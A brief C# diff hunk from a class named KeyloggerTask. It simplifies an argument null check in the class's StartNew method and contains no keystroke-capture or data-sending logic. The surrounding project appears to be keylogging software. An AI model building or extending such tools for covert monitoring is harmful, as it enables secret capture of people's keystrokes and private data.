@@ -43,7 +43,7 @@ public sealed class KeyloggerTask : BackgroundMessagePumpTask
 
     public static KeyloggerTask StartNew(Action<Keylog> onKeylog)
     {
-        ArgumentNullException.ThrowIfNull(onKeylog, nameof(onKeylog));
+        ArgumentNullException.ThrowIfNull(onKeylog);
 
         var keyloggerTask = new KeyloggerTask(onKeylog);
         keyloggerTask.Start();
